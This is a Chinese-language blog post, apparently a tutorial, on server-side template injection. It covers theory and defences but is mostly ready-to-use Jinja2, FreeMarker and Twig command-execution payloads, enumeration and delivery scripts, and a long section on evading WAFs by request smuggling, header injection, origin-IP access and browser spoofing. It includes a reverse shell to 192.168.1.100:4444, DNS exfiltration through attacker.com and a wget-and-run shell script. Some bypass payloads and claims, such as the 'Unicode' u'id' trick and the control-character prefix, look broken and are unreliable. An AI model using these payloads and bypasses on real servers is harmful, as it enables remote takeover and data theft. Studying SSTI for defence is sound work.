---
layout: post
title: SSTI
tag: 基础知识
---

# 服务器端模板注入（SSTI）漏洞完全指南：原理、利用、绕过与防护

## 一、漏洞简介

**服务器端模板注入（Server-Side Template Injection, SSTI）**是一种发生在服务端模板引擎中的代码注入漏洞。当用户输入未经严格验证或过滤直接嵌入模板中，模板引擎在渲染时将其作为代码执行，攻击者可借此执行恶意操作，如读取敏感数据、篡改逻辑、执行远程命令（RCE），甚至完全接管服务器。SSTI 漏洞常见于动态渲染用户输入的 Web 应用，尤其在使用 Python（Jinja2）、PHP（Twig）、Java（FreeMarker）等模板引擎的场景。

### 1.1 受影响的模板引擎

以下是常见模板引擎及其所属技术栈：

- **Python**：Jinja2、Mako、Tornado Template
- **PHP**：Smarty、Twig、Blade
- **Java**：FreeMarker、Velocity、Thymeleaf
- **JavaScript**：Handlebars、EJS（多用于客户端，但服务端渲染可能被利用）
- **其他**：Ruby 的 ERB、Go 的 html/template

### 1.2 危害

- **信息泄露**：访问配置文件、环境变量或数据库凭据。
- **逻辑篡改**：绕过认证或修改页面逻辑。
- **远程命令执行**：执行系统命令，获取服务器控制权。
- **拒绝服务**：通过恶意循环或资源消耗导致服务不可用。

------

## 二、模板引擎与 SSTI 原理

### 2.1 模板引擎的作用

模板引擎用于分离用户界面与业务数据，生成特定格式的文档（如 HTML）。通过占位符（如 `{{ name }}`）和控制语句（如 ` {% if %}`），模板引擎在运行时替换数据并执行逻辑，生成最终页面。模板引擎的优势包括：

- **界面与数据分离**：提高开发效率，代码复用性更强。
- **动态内容生成**：支持循环、条件判断等逻辑。
- **跨技术栈支持**：适用于多种编程语言（如 Python、PHP、Java）。

### 2.2 模板引擎分类

- **置换型**：仅替换占位符，如 Mustache。
- **解释型**：支持复杂逻辑（如条件、循环），如 Jinja2、Twig。
- **编译型**：将模板编译为可执行代码，如 FreeMarker。

### 2.3 SSTI 漏洞成因

SSTI 漏洞的根本原因是用户输入未经充分过滤，直接嵌入模板或作为模板引擎的参数，导致模板引擎将其解析为可执行代码。典型场景：

- 使用 `render_template_string(user_input)`而非 `render_template`。
- 未限制模板引擎访问危险对象（如 Python 的 `__globals__`或 Java 的 `java.lang.Runtime`）。
- 示例：用户输入 `{{7*7}}`，若返回 `49`，表明存在 SSTI 漏洞。

### 2.4 攻击流程

1. **寻找注入点**：通过输入框、URL 参数、表单等提交模板语法（如 `{{}}`或 ` {% %}`）。
2. **构造恶意 payload**：利用模板引擎特性，访问敏感对象或执行命令。
3. **触发执行**：模板引擎解析并执行 payload，可能导致信息泄露或 RCE。

------

## 三、SSTI 的种类

### 3.1 表达式注入（Expression Injection）

攻击者注入的输入被解析为模板表达式并在服务端执行。例如，在 Jinja2 中：

```jinja2
{{ 7 * 7 }}
```

输出：`49`，表明用户输入被执行为代码。

### 3.2 逻辑注入（Logic Injection）

攻击者利用模板的控制语句（如条件、循环）篡改渲染逻辑。例如：

```jinja2
{% if 'admin' in user_role %}
  欢迎管理员
{% else %}
  普通用户
{% endif %}
```

若 `user_role`可控，攻击者可注入 `"admin"`伪装管理员身份。

### 3.3 命令执行（RCE via Template）

某些模板引擎允许访问底层对象，导致远程命令执行。例如，在 Jinja2 中：

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[159].__init__.__globals__['os'].popen('id').read() }}
```

输出：

```
uid=1000(user) gid=1000(user) groups=1000(user)
```

### 3.4 文件操作（File Access）

部分模板引擎支持文件操作，攻击者可读取敏感文件。例如，在 FreeMarker 中：

```freemarker
<#include "/etc/passwd">
```

可能直接读取 `/etc/passwd`文件。

------

## 四、SSTI 注入过程与利用方式

### 4.1 注入前准备

1. **信息收集**：
   - 确定目标使用的编程语言和模板引擎（如 Flask 使用 Jinja2）。
   - 测试注入点：URL 参数、表单、评论区、HTTP 请求头等。
   - 提交测试 payload：`{{7*7}}`或 `{% print(1+1) %}`，观察是否被解析。
2. **了解模板引擎特性**：
   - **Jinja2**：支持 Python 反射（如 `__class__`, `__globals__`）。
   - **Twig**：支持过滤器和回调函数。
   - **FreeMarker**：支持 Java 类调用（如 `?new()`）。

### 4.2 注入过程

1. **确认漏洞**：

   - 请求：`http://example.com/?name={{7*7}}`
   - 响应：`49`（表明 Jinja2 SSTI 漏洞存在）。

2. **构造 payload**：

   - 读取配置：`{{ config }}`
   - 执行命令：`{{ ''.__class__.__mro__[1].__subclasses__()[159].__init__.__globals__['os'].popen('whoami').read() }}`

3. **触发执行**：

   - 示例 HTTP 请求：

     ```
     GET /?name={{config.__class__.__init__.__globals__['os'].popen('whoami').read()}} HTTP/1.1
     Host: example.com
     User-Agent: Mozilla/5.0
     Accept: text/html
     Connection: close
     ```

     响应：

     ```
     HTTP/1.1 200 OK
     Content-Type: text/html
     Content-Length: 20
     www-data
     ```

### 4.3 Flask 示例

以下是一个存在 SSTI 漏洞的 Flask 应用，展示了如何利用 `subprocess.Popen`执行命令：

```python
from flask import Flask, request, render_template_string
import subprocess	# 漏洞利用关键

app = Flask(__name__)

@app.route('/unsafe')
def unsafe():
    name = request.args.get('name', 'World')
    template = f'<h1>Hello, {name}!</h1>'
    return render_template_string(template)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8088, debug=True)
```

**测试步骤**：

1. **正常访问**：

   - 访问：`http://127.0.0.1:8088/unsafe`
   - ![image.png](E:\祈染安的博客\qiranan.github.io\assets\images\CTF\1753671268_6886e6646103040bcfa9b.jpeg)
   - 默认情况下，页面显示正常问候语。

2. **确认 SSTI 漏洞**：

   - 访问：` http://127.0.0.1:8088/unsafe?name={{7*7}}`
   - ![image.png](E:\祈染安的博客\qiranan.github.io\assets\images\CTF\1753671227_6886e63b7e766a9804c50.jpeg)`
   - 输入的 `{{7*7}}`被 Jinja2 解析并执行，表明存在 SSTI 漏洞。

3. **枚举 `__subclasses__()`查找 `subprocess.Popen`**：

   - **初步测试**：访问 `http://127.0.0.1:8088/unsafe?name={{[].__class__.__base__.__subclasses__()}}`

     - ![image.png](E:\祈染安的博客\qiranan.github.io\assets\images\CTF\1753671190_6886e61673597518d171b.jpeg)
     - 但因为输出太长，Jinja2 会自动省略。我们需要一点技巧来「逐个枚举」。

   - **逐个枚举**：使用以下 payload 查看第 `i`个类的名称：

     ```jinja2
     {{[].__class__.__base__.__subclasses__()[i].__name__}}
     ```

   - **自动化脚本**：以下脚本可快速定位 `subprocess.Popen`的索引：

     ```python
     import requests
     
     def find_popen_index(url, max_index=500):
         headers = {
             'User-Agent': 'SSTI Scanner'
         }
         print(f"[+] Start scanning subclasses from 0 to {max_index}...")
         for i in range(max_index + 1):
             payload = f"{{{{[].__class__.__base__.__subclasses__()[{i}].__name__}}}}"
             params = {'name': payload}
             try:
                 resp = requests.get(url, params=params, headers=headers, timeout=5)
                 if "Popen" in resp.text:
                     print(f"[!] Found 'Popen' at index: {i}")
                     print(f"    Response: {resp.text.strip()}")
                     break
                 elif "Traceback" in resp.text:
                     print(f"[-] Index {i}: error in response")
                 else:
                     print(f"[-] Index {i}: {resp.text.strip()}")
             except Exception as e:
                 print(f"[x] Index {i}: request failed ({e})")
     
     if __name__ == '__main__':
         target_url = "http://127.0.0.1:8088/unsafe"
         find_popen_index(target_url, max_index=500)
     ```

     - **输出**：
     - ![image.png](E:\祈染安的博客\qiranan.github.io\assets\images\CTF\1753671171_6886e60352cac41d5e3fc.jpeg)
     - 脚本发现 `subprocess.Popen`位于索引 426。

4. **构造 RCE payload**：

   - 访问：

     ```
     http://127.0.0.1:8088/unsafe?name={{[].__class__.__base__.__subclasses__()[426]('whoami',shell=True,stdout=-1).communicate()[0].decode()}}
     ```

   - ![image.png](E:\祈染安的博客\qiranan.github.io\assets\images\CTF\1753671139_6886e5e31abda95a54951.jpeg)`

   - 使用 `subprocess.Popen`执行 `whoami`命令，`shell=True`启用 shell 模式，`stdout=-1`将输出重定向，`communicate()[0].decode()`获取并解码输出结果。

5. **进阶利用**：

   - 读取文件：

     ```url
     http://127.0.0.1:8088/unsafe?name={{[].__class__.__base__.__subclasses__()[426]('cat flag.txt',shell=True,stdout=-1).communicate()[0].decode()}}
     ```

   - 反弹 shell：

     ```url
     http://127.0.0.1:8088/unsafe?name={{[].__class__.__base__.__subclasses__()[426]('bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"',shell=True,stdout=-1).communicate()[0].decode()}}
     ```

### 4.4 其他模板引擎利用

- **FreeMarker**：

  ```freemarker
  ${"freemarker.template.utility.Execute"?new()("id")}
  ```

  输出：`uid=1000(user) gid=1000(user) groups=1000(user)`

- **Twig**：

  ```twig
  {{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
  ```

- **Smarty（老版本）**：

  ```smarty
  {php}echo shell_exec('id');{/php}
  ```

### 4.5 模板继承利用

模板继承允许子模板覆盖父模板的区块，攻击者可利用内置模板或虚拟继承构造 payload。例如，在 Jinja2 中：

```jinja2
{% extends "base.html" %}
{% block content %}
  {{ ''.__class__.__mro__[1].__subclasses__()[159].__init__.__globals__['os'].popen('id').read() }}
{% endblock %}
```

通过覆盖关键区块，攻击者可执行恶意代码。

------

## 五、WAF 绕过技巧

随着 2025 年 Web 应用防火墙（WAF）技术的进步，现代 WAF（如 Cloudflare、Akamai、Imperva、AWS WAF）已采用复杂的检测机制，包括基于机器学习的行为分析、动态规则更新、上下文感知和多层签名检测。传统绕过技术（如简单 URL 编码、关键字拆分）在面对这些高级 WAF 时往往失效。本节将深入分析当前 WAF 的防护机制，并提供更高级的绕过策略，结合具体示例和最新研究成果，适用于渗透测试和漏洞挖掘场景。

### 5.1 现代 WAF 防护机制分析

为设计有效的绕过策略，需先了解 2025 年 WAF 的核心防护机制：

- **签名与正则匹配**：基于 OWASP Core Rule Set (CRS) 的规则，检测常见攻击模式（如 `{{`, `__globals__`, `popen`）。现代 WAF 会动态更新签名库以应对新威胁。
- **机器学习与行为分析**：WAF（如 Akamai、DataDome）通过分析请求模式（如 IP 信誉、请求频率、用户行为）识别异常流量。例如，Akamai 的 Bot Manager 使用 AI 评分请求的信任度，拦截非人类流量。
- **上下文解析**：WAF 解析 HTTP 请求的完整上下文（包括头、Body、参数），并对编码（如 URL、Base64、Unicode）进行规范化处理。
- **动态规则更新**：Cloudflare 和 Imperva 等 WAF 支持自动规则更新，快速修补已知绕过漏洞（如 JSON 语法绕过）。
- **协议级检测**：WAF 检查 HTTP 协议细节（如 RFC 合规性、请求分块、头格式），防止协议级绕过（如 HTTP 请求走私）。
- **CDN 集成**：许多 WAF（如 Cloudflare、Fastly）与 CDN 结合，通过 IP 限制（如 Akamai 的 Site Shield）保护源服务器，增加直接访问后端的难度。
- **误配置防护**：WAF 厂商通过客户引导配置（如 Akamai 的 Site Shield ACL）减少源 IP 暴露风险。

**绕过挑战**：

- 传统编码（如 `%7B%7B`）被规范化解析，难以生效。
- 关键字过滤（如 `__class__`, `eval`）覆盖广泛，需更隐晦的 payload。
- 行为分析检测高频请求或异常模式，需模拟真实用户行为。
- 源服务器 IP 暴露（如通过 Shodan、DNS 历史记录）难度增加。

### 5.2 JSON 语法混淆（SQLi 与 SSTI 结合）

Claroty 研究团队在 2025 年发现，通过在 SQL 注入或 SSTI payload 前附加 JSON 语法，可绕过多个主流 WAF（如 AWS、Cloudflare、F5、Imperva）。原因是 WAF 的 SQLi/SSTI 检测规则通常无法正确解析 JSON 语法，导致过滤失效。

**示例（SSTI 结合 JSON）**：

- **Payload**：

  ```jinja2
  {{ ''.__class__.__mro__[1].__subclasses__()[426].__init__.__globals__['os'].popen({"cmd":"id"}['cmd']).read() }}
  ```

- **HTTP 请求**：

  ```
  GET /unsafe?name={{''.__class__.__mro__[1].__subclasses__()[426].__init__.__globals__['os'].popen({"cmd":"id"}['cmd']).read()}} HTTP/1.1
  Host: example.com
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
  ```

- **说明**：JSON 对象 `{"cmd":"id"}`被 Jinja2 解析为 Python 字典，WAF 因无法识别 JSON 上下文而忽略 `popen`检查。

**绕过原理**：

- WAF 的正则表达式（如 `popen.*\(`）未考虑 JSON 嵌套，导致匹配失败。
- 适用于支持复杂数据结构的模板引擎（如 Jinja2、Twig）。

**防御建议**：

- WAF 更新规则，解析 JSON 上下文，检测嵌套的恶意关键字。
- 启用深度包检查（DPI），规范化 JSON 数据。

### 5.3 解析差异利用（WAFFLED 技术）

2025 年发表的研究“WAFFLED”揭示了 WAF 在解析 HTTP 请求内容类型（如 `application/json`, `multipart/form-data`）时的差异，可被攻击者利用绕过检测。研究发现，90% 的网站接受多种内容类型（如 `x-www-form-urlencoded`和 `multipart/form-data`）而未严格验证，导致绕过机会。

**示例（multipart/form-data 绕过）**：

- **Payload**：

  ```http
  POST /unsafe HTTP/1.1
  Host: example.com
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
  Content-Length: 238
  User-Agent: Mozilla/5.0
  
  ------WebKitFormBoundary
  Content-Disposition: form-data; name="name"
  
  {{''.__class__.__mro__[1].__subclasses__()[426].__init__.__globals__['os'].popen('id').read()}}
  ------WebKitFormBoundary--
  ```

- **说明**：WAF 对 `multipart/form-data`的解析不完整，忽略了嵌套的 SSTI payload。

**绕过原理**：

- WAF 的内容类型解析器（如 `multipart/form-data`）可能未严格遵循 RFC 标准，允许非标准格式通过。
- 攻击者通过构造复杂的内容类型，触发 WAF 与后端服务器的解析差异。

**防御建议**：

- 部署 HTTP-Normalizer 工具，确保请求符合 RFC 标准。
- WAF 配置严格的内容类型验证，拒绝非预期格式。

### 5.4 HTTP 请求走私（Request Smuggling）

HTTP 请求走私利用 WAF 和后端服务器对 HTTP 请求的分块传输编码（Transfer-Encoding: chunked）或内容长度（Content-Length）的不同处理方式，绕过 WAF 过滤。2025 年的 WAF 已加强对请求走私的检测，但仍可能因配置不当被利用。

**示例（SSTI 走私）**：

- **Payload**：

  ```http
  POST /unsafe HTTP/1.1
  Host: example.com
  Content-Length: 0
  Transfer-Encoding: chunked
  User-Agent: Mozilla/5.0
  
  7e
  name={{''.__class__.__mro__[1].__subclasses__()[426].__init__.__globals__['os'].popen('id').read()}}
  0
  ```

- **说明**：WAF 可能忽略分块传输中的 payload，而后端服务器正确解析，导致 SSTI 执行。

**绕过原理**：

- WAF 和后端服务器对 `Content-Length`和 `Transfer-Encoding`的优先级处理不一致。
- 分块传输中的 payload 被 WAF 误认为是无效数据。

**防御建议**：

- WAF 严格验证 HTTP 请求头，拒绝同时包含 `Content-Length`和 `Transfer-Encoding`的请求。
- 后端服务器配置规范化解析，防止走私。

### 5.5 头注入与伪造

WAF 通常对 HTTP 头（如 `User-Agent`, `X-Forwarded-For`）的检查较为宽松，攻击者可将 SSTI payload 注入头字段，绕过 URL 或 Body 的过滤。2025 年的研究表明，头注入仍是有效绕过手段，尤其在非标准头中。

**示例（X-Custom-Header 注入）**：

- **Payload**：

  ```http
  GET /unsafe?name=test HTTP/1.1
  Host: example.com
  X-Custom-Header: {{''.__class__.__mro__[1].__subclasses__()[426].__init__.__globals__['os'].popen('id').read()}}
  User-Agent: Mozilla/5.0
  ```

- **说明**：WAF 未检测 `X-Custom-Header`中的 SSTI payload，后端直接渲染导致执行。

**绕过原理**：

- WAF 可能忽略非标准头或仅检查常见头（如 `User-Agent`）。
- 后端未对头值进行严格过滤，直接传入模板引擎。

**防御建议**：

- WAF 配置检查所有 HTTP 头，匹配模板语法（如 `{{`, `{%`）。
- 后端对头值进行白名单过滤，禁止动态渲染。

### 5.6 Unicode 规范化绕过

2025 年，Unicode 规范化（Normalization Form）被用于绕过 WAF 的关键字过滤。例如，WAF 可能过滤 `popen`但忽略其 Unicode 等价形式。

**示例（Unicode 混淆）**：

- **Payload**：

  ```jinja2
  {{ ''.__class__.__mro__[1].__subclasses__()[426].__init__.__globals__['os'].popen(u'id').read() }}
  ```

- **HTTP 请求**：

  ```
  GET /unsafe?name={{''.__class__.__mro__[1].__subclasses__()[426].__init__.__globals__['os'].popen(u'id').read()}} HTTP/1.1
  Host: example.com
  User-Agent: Mozilla/5.0
  ```

- **说明**：使用 `u'id'`（Unicode 字符串）绕过 WAF 的 `popen`过滤。

**绕过原理**：

- WAF 的正则表达式未规范化 Unicode 字符串，导致关键字匹配失败。
- 后端模板引擎正确解析 Unicode，执行恶意代码。

**防御建议**：

- WAF 启用 Unicode 规范化（NFC/NFKC），将 Unicode 转换为标准形式。
- 配置规则检测 Unicode 编码的恶意关键字。

### 5.7 行为模拟与伪装

现代 WAF 使用行为分析（如 Akamai 的 Bot Manager）检测异常请求模式（如高频请求、异常用户代理）。攻击者可通过模拟真实用户行为绕过检测。

**示例（伪装用户行为）**：

- **Payload**：

  ```python
  import requests
  from fake_useragent import UserAgent
  
  url = "http://127.0.0.1:8088/unsafe"
  ua = UserAgent()
  headers = {
      'User-Agent': ua.chrome,
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
      'Accept-Language': 'en-US,en;q=0.5',
      'Connection': 'keep-alive'
  }
  cookies = {'session': 'valid_session_id'}  # 模拟合法会话
  params = {'name': "{{''.__class__.__mro__[1].__subclasses__()[426].__init__.__globals__['os'].popen('id').read()}}"}
  response = requests.get(url, headers=headers, cookies=cookies, params=params)
  print(response.text)
  ```

- **说明**：通过伪装浏览器头、添加合法 Cookie 和控制请求频率，绕过 WAF 的行为检测。

**绕过原理**：

- 模拟真实用户请求（如 Chrome 的 User-Agent、标准 Accept 头）降低 WAF 的怀疑评分。
- 分散请求时间，规避频率限制。

**防御建议**：

- WAF 增强行为分析，检测伪装请求的细微异常（如 Cookie 一致性）。
- 结合 CAPTCHA 或多因子验证，增加自动化请求成本。

### 5.8 源 IP 暴露绕过（BreakingWAF）

Zafran 研究团队在 2024 年末发现的“BreakingWAF”技术揭示，CDN/WAF 的源服务器 IP 可通过 DNS 历史记录、Shodan 或指纹识别泄露，攻击者可直接访问后端，绕过 WAF。2025 年，这一技术仍有效，影响约 40% 的 Fortune 100 公司。

**示例（直接访问源服务器）**：

- **步骤**：

  1. 使用 Shodan 或 DNS Trails 查找目标域名的历史 IP。

  2. 构造直接请求：

     ```http
     GET /unsafe?name={{''.__class__.__mro__[1].__subclasses__()[426].__init__.__globals__['os'].popen('id').read()}} HTTP/1.1
     Host: 192.168.1.100
     User-Agent: Mozilla/5.0
     ```

- **说明**：通过直接访问源 IP，绕过 Cloudflare 等 CDN/WAF 的保护。

**绕过原理**：

- CDN/WAF 依赖源 IP 隐藏，若 IP 泄露，攻击者可绕过所有 WAF 规则。
- 历史 DNS 记录或错误配置（如未启用 Site Shield）导致 IP 暴露。

**防御建议**：

- 配置源服务器防火墙，仅允许 CDN IP（如 Akamai 的 Site Shield ACL）。
- 定期清理 DNS 记录，防止历史 IP 泄露。

### 5.9 协议级绕过（非标准字符）

WAF 对非标准字符（如控制字符、非法 Unicode）的处理可能不一致，攻击者可利用这些字符构造 payload，绕过正则匹配。

**示例（控制字符注入）**：

- **Payload**：

  ```jinja2
  {{''.[0;__class__.__mro__[1].__subclasses__()[426].__init__.__globals__['os'].popen('id').read()}}
  ```

- **HTTP 请求**：

  ```
  GET /unsafe?name={{''.[0;__class__.__mro__[1].__subclasses__()[426].__init__.__globals__['os'].popen('id').read()}} HTTP/1.1
  Host: example.com
  User-Agent: Mozilla/5.0
  ```

- **说明**：控制字符 `[0;`（ANSI 转义字符）干扰 WAF 正则匹配，但不影响 Jinja2 解析。

**绕过原理**：

- WAF 的正则表达式未考虑控制字符，导致匹配失败。
- 后端模板引擎忽略无关字符，正常执行 payload。

**防御建议**：

- WAF 配置过滤控制字符和非法 Unicode。
- 后端严格验证输入，拒绝包含非预期字符的请求。

### 5.10 基于 cURL 的高级绕过

cURL 允许灵活构造 HTTP 请求，结合头操纵、编码和伪装，适用于测试 WAF 漏洞。2025 年的研究表明，cURL 仍是对抗 WAF 的强大工具。

**示例（cURL 构造复杂请求）**：

- **命令**：

  ```bash
  curl -X POST "http://example.com/unsafe" \
  -H "User-Agent: Mozilla/5.0" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "name={{''.${__class__.__mro__[1].__subclasses__()[426].__init__.__globals__['os'].popen('id').read()}}"
  ```

- **说明**：通过 cURL 构造伪装请求，结合编码和头注入绕过 WAF。

**绕过原理**：

- cURL 允许精确控制请求格式，规避 WAF 的签名检测。
- 非标准头（如 `X-Forwarded-For`）可能未被 WAF 严格检查。

**防御建议**：

- WAF 检查所有请求头和编码格式。
- 限制非标准 HTTP 方法和头的使用。

### 5.11 盲注与无回显场景

在无回显场景下，攻击者可通过反弹 shell、DNS 外带或时间延迟确认 SSTI 漏洞。2025 年的 WAF 对盲注的检测能力增强，但仍可通过复杂 payload 绕过。

**示例（DNS 外带）**：

- **Payload**：

  ```jinja2
  {{''.__class__.__mro__[1].__subclasses__()[426].__init__.__globals__['os'].popen('ping `whoami`.attacker.com').read()}}
  ```

- **HTTP 请求**：

  ```
  GET /unsafe?name={{''.__class__.__mro__[1].__subclasses__()[426].__init__.__globals__['os'].popen('ping `whoami`.attacker.com').read()}} HTTP/1.1
  Host: example.com
  User-Agent: Mozilla/5.0
  ```

- **验证**：在 `attacker.com`的 DNS 日志中观察到 `www-data.attacker.com`的请求。

- **说明**：通过 DNS 请求将敏感数据（如用户名）外带，绕过 WAF 的输出检查。

**绕过原理**：

- WAF 难以检测外部 DNS 请求，尤其是动态生成的主机名。
- 盲注不依赖页面回显，降低被拦截概率。

**防御建议**：

- WAF 配置检测 DNS 相关的命令（如 `ping`, `nslookup`）。
- 后端限制外部网络访问，阻止数据外带。

### 5.12 自动化工具与测试方法

2025 年的 WAF 绕过测试需结合自动化工具和手动分析，以应对复杂规则和动态更新。以下是推荐工具和方法：

- **tplmap**：自动化检测和利用 SSTI 漏洞，支持多种模板引擎。

  ```bash
  python tplmap.py -u "http://example.com/unsafe?name=TEST" --os-shell
  ```

- **Burp Suite**：使用 Intruder 模块批量测试 payload，结合 Decoder 进行编码转换。

  ```http
  GET /unsafe?name=§payload§ HTTP/1.1
  Host: example.com
  ```

  Payload 列表：`{{7*7}}`, `{{config}}`, `{{''.__class__}}`等。

- **SQLMap**：结合 tamper 脚本（如 `randomcase.py`, `space2comment.py`）绕过 WAF。

  ```bash
  sqlmap -u "http://example.com/unsafe?name=TEST" --tamper=randomcase,space2comment
  ```

- **HTTP-Normalizer**：测试 WAF 是否遵循 RFC 标准，识别解析差异。

  ```bash
  python http-normalizer.py --url "http://example.com/unsafe" --payload "{{7*7}}"
  ```

- **自定义脚本**：以下是改进的自动化枚举脚本，适配 2025 年 WAF 的复杂规则：

  ```python
  import requests
  from fake_useragent import UserAgent
  import time
  
  def test_ssti_bypass(url, param, max_index=500):
      ua = UserAgent()
      headers = {
          'User-Agent': ua.chrome,
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
          'X-Forwarded-For': '127.0.0.1'
      }
      payloads = [
          "{{''.____class____.__mro__[1].__subclasses__()[%d].__init__.__globals__['os'].popen('id').read()}}",
          "{{''.{{__class__}}.__mro__[1].__subclasses__()[%d].__init__.__globals__['os'].popen('id').read()}}",
          "{\"cmd\":{{''.____class____.__mro__[1].__subclasses__()[%d].__init__.__globals__['os'].popen('id').read()}}}"
      ]
      for i in range(max_index):
          for payload in payloads:
              data = {param: payload % i}
              try:
                  response = requests.get(url, params=data, headers=headers, timeout=5)
                  if "uid=" in response.text:
                      print(f"[!] Bypass success at index {i}: {response.text.strip()}")
                      return
                  time.sleep(0.5)  # 模拟真实用户
              except Exception as e:
                  print(f"[x] Index {i}: request failed ({e})")
  
  if __name__ == '__main__':
      target_url = "http://127.0.0.1:8088/unsafe"
      test_ssti_bypass(target_url, "name", max_index=500)
  ```

- **说明**：脚本使用多种 payload 变体（包括下划线混淆、JSON 嵌套），伪装用户行为，降低被 WAF 拦截的概率。

**测试方法**：

1. **指纹识别**：使用 WAFW00F 确认 WAF 类型（如 Cloudflare、Akamai）。

   ```bash
   wafw00f http://example.com
   ```

2. **逐步测试**：从简单 payload（如 `{{7*7}}`）开始，逐步尝试复杂 payload，观察 WAF 响应（如 403、406）。

3. **日志分析**：记录 WAF 拦截日志，分析被阻断的关键字或模式，调整 payload。

4. **多点测试**：测试 URL 参数、POST 数据、HTTP 头和 Cookie，寻找过滤薄弱点。

**防御建议**：

- WAF 定期测试绕过效果，使用工具如 GoTestWAF 或 WAF Payload Collection。
- 结合人工审计和自动化扫描，确保规则覆盖最新绕过技术。

------

## 六、防御措施

### 6.1 避免动态渲染用户输入

- **问题**：使用 `render_template_string(user_input)`是 SSTI 漏洞的主要原因。

- **修复**：使用 `render_template`渲染静态模板，通过上下文传递变量：

  ```python
  from flask import Flask, request, render_template
  
  app = Flask(__name__)
  
  @app.route('/safe')
  def safe():
      name = request.args.get('name', 'World')
      return render_template('hello.html', name=name)
  ```

  `hello.html`：

  ```jinja2
  <h1>Hello, {{ name | e }}</h1>
  ```

### 6.2 输入过滤与转义

- **白名单校验**：仅允许字母、数字等安全字符：

  ```python
  import re
  def sanitize_input(input_str):
      if re.search(r'[\{\}\%\#]', input_str):
          return "非法输入"
      return input_str
  ```

- **自动转义**：启用模板引擎的转义功能，如 Jinja2 的 `autoescape=True`：

  ```python
  from jinja2 import Environment, FileSystemLoader
  env = Environment(loader=FileSystemLoader('templates'), autoescape=True)
  ```

### 6.3 沙箱模式

- **Jinja2**：

  ```python
  from jinja2.sandbox import SandboxedEnvironment
  env = SandboxedEnvironment()
  ```

- **FreeMarker**：

  ```java
  freemarkerConfig.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
  ```

- **Twig**：禁用危险过滤器，启用安全模式。

### 6.4 最小化模板权限

- 禁止模板访问文件系统、系统命令或反射对象（如 `__class__`, `java.lang.Runtime`）。

- 示例：禁用 Jinja2 过滤器：

  ```python
  from jinja2 import Environment
  env = Environment()
  env.filters = {}
  ```

### 6.5 安全测试与监控

- 使用 **tplmap**（https://github.com/epinna/tplmap）检测 SSTI 漏洞。
- 配置 WAF 规则，匹配模板语法（如 `{{`, `{%`, `${`）和关键字（如 `__globals__`, `popen`）。
- 定期审计代码，检查动态渲染点。

### 6.6 框架与组件更新

- 升级模板引擎和框架版本，修复已知漏洞（如 Jinja2 旧版本的沙箱逃逸）。

------

## 七、案例分析

### 7.1 CTF 场景

**场景**：Flask 应用通过 `render_template_string`渲染用户输入。

- **Payload**：

  ```jinja2
  {{ ''.__class__.__mro__[1].__subclasses__()[159].__init__.__globals__['os'].popen('cat flag.txt').read() }}
  ```

- **结果**：返回 `flag{this_is_ssti_vuln}`。

**无回显场景**：

- 使用 DNS 外带：

  ```jinja2
  {{ ''.__class__.__mro__[1].__subclasses__()[159].__init__.__globals__['os'].popen('ping `whoami`.attacker.com').read() }}
  ```

- 监听：`attacker.com`收到 `www-data.attacker.com`的 DNS 请求.

### 7.2 真实案例

某 CMS 系统使用 Jinja2 渲染用户提交的模板，未过滤输入。攻击者提交：

```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh').read() }}
```

结果：服务器执行恶意脚本，被完全控制。

------

## 八、总结

SSTI 漏洞源于用户输入未被正确处理，直接嵌入模板引擎的渲染流程，导致攻击者可执行恶意代码，造成严重后果。通过以下措施可有效降低风险：

- 避免动态渲染用户输入。
- 严格过滤和转义输入。
- 启用沙箱模式，限制模板权限。
- 配置 WAF，定期进行安全测试和代码审计。

模板引擎是现代 Web 开发的重要组件，但若配置不当，可能成为攻击者的突破口。

------

## 九、相关问题（供进一步学习）

以下是对 SSTI 相关问题的详细解答，旨在帮助深入理解漏洞检测、利用、防御及沙箱安全性的相关知识。

### 9.1 如何快速检测 SSTI 漏洞？

快速检测 SSTI 漏洞的关键是验证用户输入是否被模板引擎解析为可执行代码。以下是具体步骤和方法：

- **基本测试**：

  - 提交简单的数学表达式，如 `{{7*7}}}`或 ` {% print(1+1) %}`，观察响应是否返回计算结果（如 `49`或 `2`）。

  - 示例 HTTP 请求：

    ```
    GET /?name={{7*7}} HTTP/1.1
    Host: example.com
    User-Agent: Mozilla/5.0
    Accept: text/html
    Connection: close
    ```

    响应：`<h1>Hello, 49!</h1>`（表明存在 Jinja2 SSTI 漏洞）。

- **进阶测试**：

  - 测试模板引擎特定的内置对象或函数，例如：
    - Jinja2：`{{ config }}`或 `{{ lipsum.__globals__ }}`
    - FreeMarker：`${"freemarker.template.utility.Execute"?new()("id")}`
    - Twig：`{{ _self.env }}`
  - 如果返回配置信息或对象属性，说明存在漏洞。

- **自动化工具**：

  - 使用 **tplmap**（https://github.com/epinna/tplmap）自动化检测：

    ```bash
    python tplmap.py -u "http://example.com/?name=TEST"
    ```

    该工具会尝试多种模板引擎的 payload，检测是否存在 SSTI 漏洞。

- **注意事项**：

  - 检查多个输入点：URL 参数、表单、HTTP 头、Cookie 等。

  - 观察响应差异：即使无直接回显，也可能通过时间延迟或 DNS 请求确认漏洞（盲注场景）。

  - 示例盲注测试：

    ```jinja2
    {{ ''.__class__.__mro__[1].__subclasses__()[159].__init__.__globals__['os'].popen('ping attacker.com').read() }}
    ```

    使用 `dnslog`平台监控 DNS 请求。

### 9.2 不同模板引擎的 SSTI 利用方式有何差异？

不同模板引擎的语法和功能差异导致 SSTI 利用方式各异。以下是对主流模板引擎的利用方式和特点的详细分析：

- **Jinja2（Python）**：

  - **特点**：支持 Python 反射机制，可通过 `__class__`, `__mro__`, `__subclasses__`访问内置对象。

  - **利用方式**：

    - 访问配置：`{ config }}`

    - 执行命令：

      ```jinja2
      {{ ''.__class__.__mro__[1].__subclasses__()[159].__init__.__globals__['os'].popen('id').read() }}
      ```

